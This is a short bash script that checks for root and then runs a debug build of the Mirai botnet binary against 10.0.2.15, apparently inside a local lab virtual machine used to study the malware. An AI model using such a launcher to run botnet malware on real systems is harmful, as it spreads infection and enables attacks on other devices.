#!/bin/bash
if [[ $EUID > 0 ]]
  then echo "Please run as root"
  exit
fi
echo "running bot"
sudo ./debug/mirai.dbg 10.0.2.15 10.0.2.15 10.0.2.15 0
